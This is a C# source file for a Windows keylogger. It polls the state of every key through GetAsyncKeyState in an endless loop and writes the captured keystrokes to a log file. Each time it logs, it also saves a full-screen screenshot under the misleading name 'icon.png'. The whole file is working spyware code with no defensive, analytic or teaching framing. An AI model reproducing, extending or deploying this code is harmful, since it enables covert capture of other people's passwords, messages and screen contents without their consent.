using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace OperLog
{
    class Log
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
       public static void KeyLog()
        {
            string buf = "";
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Escape) { buf += "esc"; continue; }
                        if (((Keys)i) == Keys.Back) { buf += "<-"; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += ((Keys)i).ToString();
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > 10)
                        {
                            Snap();
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }
            }
        }
       static void Snap()
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                bmp.Save("icon.png", ImageFormat.Png);
            }
            catch (Exception)
            {
                // Application.Restart(); 
            }
        }
    }
}
